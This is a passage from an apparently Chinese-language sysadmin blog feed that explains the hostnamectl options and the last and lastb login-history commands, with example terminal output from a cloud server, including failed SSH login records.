class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl set-hostname aliyun#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br>aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /etc/machine-i</span><br>machine-id    machine-info<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /etc/machine-info</span><br><span class="hljs-title class_">PRETTY_HOSTNAME</span>=aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># ls -lat /etc/machine-info</span><br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">28</span> <span class="hljs-title class_">Jan</span> <span class="hljs-number">30</span> <span class="hljs-number">15</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> /etc/machine-info<br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>aliyun<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --transient</span><br>aliyun<br><br><br></code></pre></td></tr></table></figure><p>可以指定只修改某个主机名 hostnamectl –static set-hostname iZbp1191gh7vw52537lyxrZ</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static set-hostname iZbp1191gh7vw52537lyxrZ</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br>aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>iZbp1191gh7vw52537lyxrZ<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --transient</span><br>iZbp1191gh7vw52537lyxrZ<br></code></pre></td></tr></table></figure><h4 id="set-icon-name-icon-name-NAME"><a href="#set-icon-name-icon-name-NAME" class="headerlink" title="set-icon-name&#x2F;icon-name NAME"></a>set-icon-name&#x2F;icon-name NAME</h4><p>设置主机图标名称，图标名称用于一些图形化程序可视化当前主机</p><p>NAME 为空’’的时候，会重置为默认值</p><p>一般都是 computer-vm</p><h4 id="set-chassis-chassis-TYPE"><a href="#set-chassis-chassis-TYPE" class="headerlink" title="set-chassis&#x2F;chassis TYPE"></a>set-chassis&#x2F;chassis TYPE</h4><p>设置主机类型，主机类型用于一些图形化程序可视化主机或者修改用户交互</p><p>TYPE  为空’’的时候，会重置为默认值</p><p>TYPE可选参数：</p><p>desktop</p><p>laptop（笔记本）</p><p>server</p><p>tablet（平板电脑）</p><p>handset（手机）</p><p>watch</p><p>embedded</p><p>vm</p><p>container</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs scss">root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl set-chassis watch<br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-attribute">hostname</span>: aliyun#@##@<br>       Icon <span class="hljs-attribute">name</span>: computer-watch<br>         <span class="hljs-attribute">Chassis</span>: watch<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br><br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl set-chassis <span class="hljs-string">&#x27;&#x27;</span><br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-attribute">hostname</span>: aliyun#@##@<br>       Icon <span class="hljs-attribute">name</span>: computer-vm<br>         <span class="hljs-attribute">Chassis</span>: vm<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h4 id="set-deployment-deployment-ENVIRONMENT"><a href="#set-deployment-deployment-ENVIRONMENT" class="headerlink" title="set-deployment&#x2F;deployment ENVIRONMENT"></a>set-deployment&#x2F;deployment ENVIRONMENT</h4><p>设置环境描述</p><p>ENVIRONMENT 不可以包含控制字符</p><p>ENVIRONMENT 建议的值：</p><p>development</p><p>integration</p><p>staging</p><p>production</p><p>ENVIRONMENT  为空’’的时候，会重置为默认值</p><h4 id="set-location-location-LOCATION"><a href="#set-location-location-LOCATION" class="headerlink" title="set-location&#x2F;location LOCATION"></a>set-location&#x2F;location LOCATION</h4><p>设置设备所处位置</p><p>LOCATION 为空’’的时候，会重置为默认值</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>last-lastb</title>
    <link href="/2024/03/15/yunwei/commands/last&amp;lastb/"/>
    <url>/2024/03/15/yunwei/commands/last&amp;lastb/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="last"><a href="#last" class="headerlink" title="last"></a>last</h1><p>last命令会读取用户登录日志内容展示出来，默认&#x2F;var&#x2F;log&#x2F;wtmp，也可以通过 -f 来指定文件</p><h2 id="参数描述"><a href="#参数描述" class="headerlink" title="参数描述"></a>参数描述</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>last [-R] [-num] [ -n num ] [-adFiowx] [ -f file ] [ -t YYYYMMDDHHMMSS ] [name…]  [tty…]</p><p>-f file:指定读取的文件，默认为&#x2F;var&#x2F;log&#x2F;wtmp</p><p>-num</p><p>-n num :显示多少行的数据</p><p>-R:禁止显示主机名</p><p>-a:最后一列显示源主机名</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> <span class="hljs-built_in">log</span>]<span class="hljs-meta"># last -n 10 -a</span><br>root     pts/<span class="hljs-number">1</span>        Tue Nov <span class="hljs-number">16</span> <span class="hljs-number">20</span>:<span class="hljs-number">23</span>   still logged <span class="hljs-keyword">in</span>    <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><p>-d:最后一列替换为源主机IP</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> <span class="hljs-built_in">log</span>]<span class="hljs-meta"># last -n 10 -a -d</span><br>root     pts/<span class="hljs-number">1</span>        Tue Nov <span class="hljs-number">16</span> <span class="hljs-number">20</span>:<span class="hljs-number">23</span>   still logged <span class="hljs-keyword">in</span>    <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><p>-F:登录时间，推出时间完整展示</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@110 log]<span class="hljs-comment"># last -n 10 -a -d -F</span><br>root     pts/1        Tue Nov<span class="hljs-number"> 16 </span>20:23:07<span class="hljs-number"> 2021 </span>  still logged in                       1.1.1.1<br>root     pts/0        Tue Nov<span class="hljs-number"> 16 </span>09:35:43<span class="hljs-number"> 2021 </span>  still logged in                       1.1.1.1<br>root     pts/0        Mon Nov<span class="hljs-number"> 15 </span>16:16:36<span class="hljs-number"> 2021 </span>- Mon Nov<span class="hljs-number"> 15 </span>19:30:01<span class="hljs-number"> 2021 </span> (03:13)     1.1.1.1<br>reboot   system boot  Tue Nov<span class="hljs-number"> 16 </span>00:14:47<span class="hljs-number"> 2021 </span>- Tue Nov<span class="hljs-number"> 16 </span>20:50:34<span class="hljs-number"> 2021 </span> (20:35)     0.0.0.0<br>root     pts/1        Mon Nov<span class="hljs-number"> 15 </span>15:38:35<span class="hljs-number"> 2021 </span>- down                      (00:36)     1.1.1.1<br>root     pts/0        Mon Nov<span class="hljs-number"> 15 </span>15:08:20<span class="hljs-number"> 2021 </span>- down                      (01:06)     1.1.1.1<br>root     pts/1        Thu Nov<span class="hljs-number"> 11 </span>20:55:21<span class="hljs-number"> 2021 </span>- Thu Nov<span class="hljs-number"> 11 </span>23:11:33<span class="hljs-number"> 2021 </span> (02:16)     1.1.1.1<br></code></pre></td></tr></table></figure><p>命令读取的文件：</p><p>&#x2F;var&#x2F;log&#x2F;wtmp</p><p>该文件为二进制文件，无法直接用cat查看</p><h2 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>lastb命令和last命令类似，默认&#x2F;var&#x2F;log&#x2F;btmp，会显示所有登录记录（成功+失败）</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>lastb [-R] [-num] [ -n num ] [ -f file ] [-adFiowx] [name…]  [tty…]</p><h4 id="lastb-1"><a href="#lastb-1" class="headerlink" title="lastb"></a>lastb</h4><p>显示登录失败的用户信息</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ log]# lastb | more<br>         ssh:notty    175.24.152.224   Thu Aug 25 04:36 - 04:36  (00:00)<br>git      ssh:notty    60.171.76.133    Thu Aug 25 02:59 - 02:59  (00:00)<br>git      ssh:notty    60.171.76.133    Thu Aug 25 02:59 - 02:59  (00:00)<br>psxtg    ssh:notty    192.46.210.172   Wed Aug 24 19:23 - 19:23  (00:00)<br>scdva    ssh:notty    195.96.137.7     Wed Aug 24 17:40 - 17:40  (00:00)<br>         ssh:notty    110.42.200.114   Wed Aug 24 15:14 - 15:14  (00:00)<br>         ssh:notty    175.24.152.224   Wed Aug 24 11:30 - 11:30  (00:00)<br>         ssh:notty    110.42.200.114   Tue Aug 23 18:12 - 18:12  (00:00)<br>root     ssh:notty    201.213.185.243  Tue Aug 23 04:32 - 04:32  (00:00)<br>         ssh:notty    42.194.144.103   Tue Aug 23 00:07 - 00:07  (00:00)<br>username ssh:notty    183.136.225.14   Mon Aug 22 22:53 - 22:53  (00:00)<br>         ssh:notty    65.49.20.68      Mon Aug 22 15:54 - 15:54  (00:00)<br>         ssh:notty    110.42.200.114   Mon Aug 22 13:18 - 13:18  (00:00)<br>test1    pts/2        Thu Aug 18 23:53 - 23:53  (00:00)<br>         ssh:notty    Thu Aug 18 23:38 - 23:38  (00:00)<br><span class="hljs-keyword">test     </span>pts/3        Thu Aug 18 23:24 - 23:24  (00:00)<br><span class="hljs-keyword">test     </span>pts/1        Thu Aug 18 23:11 - 23:11  (00:00)<br>...<br>btmp begins Mon Aug  1 18:23:34 2022<br></code></pre></td></tr></table></figure><h4 id="lastb-d-将IP转换为主机名显示"><a href="#lastb-d-将IP转换为主机名显示" class="headerlink" title="lastb -d 将IP转换为主机名显示"></a>lastb -d 将IP转换为主机名显示</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span>#  <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-d</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">192</span><span class="hljs-selector-tag">-46-210-172</span><span class="hljs-selector-class">.i</span> <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">195.96</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.7</span>     <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">15</span>:<span class="hljs-number">14</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">15</span>:<span class="hljs-number">14</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">11</span>:<span class="hljs-number">30</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">11</span>:<span class="hljs-number">30</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">18</span>:<span class="hljs-number">12</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">18</span>:<span class="hljs-number">12</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">201.213</span><span class="hljs-selector-class">.185</span><span class="hljs-selector-class">.243</span>. <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">42.194</span><span class="hljs-selector-class">.144</span><span class="hljs-selector-class">.103</span>   <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">00</span>:<span class="hljs-number">07</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">00</span>:<span class="hljs-number">07</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">username</span> <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">183.136</span><span class="hljs-selector-class">.225</span><span class="hljs-selector-class">.14</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">22</span>:<span class="hljs-number">53</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">22</span>:<span class="hljs-number">53</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">scan-19</span><span class="hljs-selector-class">.shadowse</span> <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">15</span>:<span class="hljs-number">54</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">15</span>:<span class="hljs-number">54</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">13</span>:<span class="hljs-number">18</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">13</span>:<span class="hljs-number">18</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-f-filename-读取指定文件记录"><a href="#lastb-f-filename-读取指定文件记录" class="headerlink" title="lastb -f filename 读取指定文件记录"></a>lastb -f filename 读取指定文件记录</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># lastb -f btmp-20220801</span><br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">65</span>.<span class="hljs-number">49</span>.<span class="hljs-number">20</span>.<span class="hljs-number">68</span>      Sat <span class="hljs-keyword">Jul </span><span class="hljs-number">30</span> <span class="hljs-number">09</span>:<span class="hljs-number">47</span> - <span class="hljs-number">09</span>:<span class="hljs-number">47</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-keyword">jvipu </span>   ssh:notty    <span class="hljs-number">45</span>.<span class="hljs-number">33</span>.<span class="hljs-number">65</span>.<span class="hljs-number">249</span>     Fri <span class="hljs-keyword">Jul </span><span class="hljs-number">29</span> <span class="hljs-number">08</span>:<span class="hljs-number">25</span> - <span class="hljs-number">08</span>:<span class="hljs-number">25</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">178</span>.<span class="hljs-number">73</span>.<span class="hljs-number">215</span>.<span class="hljs-number">171</span>   Fri <span class="hljs-keyword">Jul </span><span class="hljs-number">29</span> <span class="hljs-number">06</span>:<span class="hljs-number">11</span> - <span class="hljs-number">06</span>:<span class="hljs-number">11</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">64</span>.<span class="hljs-number">62</span>.<span class="hljs-number">197</span>.<span class="hljs-number">227</span>    Wed <span class="hljs-keyword">Jul </span><span class="hljs-number">27</span> <span class="hljs-number">11</span>:<span class="hljs-number">52</span> - <span class="hljs-number">11</span>:<span class="hljs-number">52</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">64</span>.<span class="hljs-number">62</span>.<span class="hljs-number">197</span>.<span class="hljs-number">227</span>    Tue <span class="hljs-keyword">Jul </span><span class="hljs-number">26</span> <span class="hljs-number">22</span>:<span class="hljs-number">16</span> - <span class="hljs-number">22</span>:<span class="hljs-number">16</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>root     ssh:notty    <span class="hljs-number">39</span>.<span class="hljs-number">174</span>.<span class="hljs-number">65</span>.<span class="hljs-number">227</span>    Tue <span class="hljs-keyword">Jul </span><span class="hljs-number">26</span> <span class="hljs-number">03</span>:<span class="hljs-number">31</span> - <span class="hljs-number">03</span>:<span class="hljs-number">31</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><br><span class="hljs-keyword">btmp-20220801 </span><span class="hljs-keyword">begins </span>Fri <span class="hljs-keyword">Jul </span> <span class="hljs-number">1</span> <span class="hljs-number">03</span>:<span class="hljs-number">55</span>:<span class="hljs-number">47</span> <span class="hljs-number">2022</span><br></code></pre></td></tr></table></figure><h4 id="lastb-n-num-lastb-nnum-显示指定行数"><a href="#lastb-n-num-lastb-nnum-显示指定行数" class="headerlink" title="lastb -n num&#x2F;lastb -nnum 显示指定行数"></a>lastb -n num&#x2F;lastb -nnum 显示指定行数</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># last -n 2</span><br>root     pts/0        218.30.113.53    Thu Aug<span class="hljs-number"> 25 </span>09:31   still logged in<br>root     pts/1        125.33.205.114   Wed Aug<span class="hljs-number"> 24 </span>23:47 - 00:17  (00:30)<br><br>wtmp begins Tue Nov<span class="hljs-number"> 30 </span>15:31:43 2021<br>[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># last -n2</span><br>root     pts/0        218.30.113.53    Thu Aug<span class="hljs-number"> 25 </span>09:31   still logged in<br>root     pts/1        125.33.205.114   Wed Aug<span class="hljs-number"> 24 </span>23:47 - 00:17  (00:30)<br><br>wtmp begins Tue Nov<span class="hljs-number"> 30 </span>15:31:43 2021<br></code></pre></td></tr></table></figure><h4 id="lastb-R-不显示主机名或IP"><a href="#lastb-R-不显示主机名或IP" class="headerlink" title="lastb -R 不显示主机名或IP"></a>lastb -R 不显示主机名或IP</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-R</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> 